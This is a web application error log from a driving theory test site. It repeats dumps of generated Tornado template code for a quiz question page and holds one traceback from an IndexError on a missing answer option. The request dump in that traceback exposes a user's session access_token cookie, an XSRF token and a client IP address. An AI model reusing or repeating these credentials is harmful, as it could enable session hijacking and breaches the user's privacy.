 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505a0dd08e4c854816f4873e&answers=%5B0%5D&cursor=0&_xsrf=d58106729c2e4a039becf93ccaeb1433', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-us', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/536.25 (KHTML, like Gecko) Version/6.0 Safari/536.25', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '109.158.140.86', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFCVnlyVGtpTnpOcDFyR1ZzSGhUSkJFekYxSHRKbWw0UVE0bURON2pVQ0JnbU9OQ2owa2NMZVNaQ0o5VmJiazQ2THBRSEM1UEJMdEwycW9zRUZ0S3l5b2tGNVFaRFpE|1348079052|12d44822feb080fddbd8c92ffec64d3626ebf227; _xsrf=d58106729c2e4a039becf93ccaeb1433; __utma=188782963.2109519635.1347966676.1347966676.1348079037.2; __utmb=188782963.3.10.1348079037; __utmc=188782963; __utmz=188782963.1347966676.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 70.09ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
